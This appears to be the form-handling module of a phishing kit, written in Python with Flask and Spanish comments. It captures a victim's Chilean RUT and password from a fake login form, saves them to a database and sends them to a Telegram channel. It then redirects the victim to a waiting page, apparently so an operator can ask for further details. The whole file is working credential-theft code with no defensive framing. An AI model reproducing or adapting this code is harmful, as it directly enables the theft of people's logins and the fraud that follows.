from flask import redirect
from modules.telegram import send_telegram
import uuid

def process_forms(request, db, config):

    form_type = request.form.get("type")

    # ==== LOGIN ====
    if form_type == "login":
        rut = request.form.get("rut")
        clave = request.form.get("clave")

        session_id = "user_" + uuid.uuid4().hex[:12]

        cursor = db.cursor()
        
        # ⚠ NO pedir automáticamente el número
        cursor.execute(
            "INSERT INTO sessions (id, rut, clave, action_request) VALUES (%s, %s, %s, %s)",
            (session_id, rut, clave, None)  # <<<<<<<<<<<<<< AQUI EL FIX
        )
        db.commit()

        # enviar Telegram
        send_telegram(f"Nuevo login: {rut} / {clave}", config)

        return redirect(f"/espera?id={session_id}")

    return "Formulario desconocido", 400
